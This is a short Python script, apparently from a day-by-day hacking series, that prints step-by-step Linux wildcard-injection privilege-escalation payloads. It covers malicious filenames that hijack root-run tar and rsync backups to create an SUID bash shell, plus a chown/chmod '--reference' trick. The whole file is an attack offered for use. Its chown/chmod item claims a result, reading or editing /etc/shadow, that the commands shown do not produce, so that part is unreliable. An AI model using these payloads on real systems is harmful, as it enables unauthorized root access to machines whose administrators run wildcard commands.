import sys

def generate_wildcard_payloads():
    print("\n[*] Bhai, starting Linux Wildcard (*) Injection Payload Generator...")
    print("[*] Create these fake files in the directory where the admin runs a wildcard command!\n")
    print("==================================================")

    # 1. TAR Command (Most Common for Backups)
    print("[+] Target Command: 'tar' (e.g., tar -cf backup.tar *)")
    print("    [!] Hacker Action: Run these commands in the target directory:")
    print("    $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh")
    print("    $ chmod +x shell.sh")
    print("    $ touch \"--checkpoint=1\"")
    print("    $ touch \"--checkpoint-action=exec=sh shell.sh\"")
    print("    [+] Result: When 'tar *' runs, it will copy bash to /tmp and make it SUID! Run /tmp/bash -p to get root.\n")

    # 2. RSYNC Command (Used for syncing files)
    print("[+] Target Command: 'rsync' (e.g., rsync -a * /backup/)")
    print("    [!] Hacker Action: Run these commands in the target directory:")
    print("    $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh")
    print("    $ chmod +x shell.sh")
    print("    $ touch \"-e sh shell.sh\"")
    print("    [+] Result: rsync treats the filename as the '-e' (rsh) option and executes your shell script.\n")

    # 3. CHOWN/CHMOD Command (Changing permissions)
    print("[+] Target Command: 'chown' or 'chmod' (e.g., chown user:user *)")
    print("    [!] Hacker Action: Run these commands in the target directory:")
    print("    $ touch \"--reference=/etc/shadow\"")
    print("    $ touch \"victim_file.txt\"")
    print("    [+] Result: chown/chmod will steal the permissions of /etc/shadow and apply them to victim_file.txt. You can now read/edit shadow!\n")

    print("==================================================")
    print("[*] Pro-Tip: Use Day 81's Cronjob Hunter to find directories where root runs wildcard commands!")

if __name__ == "__main__":
    generate_wildcard_payloads()
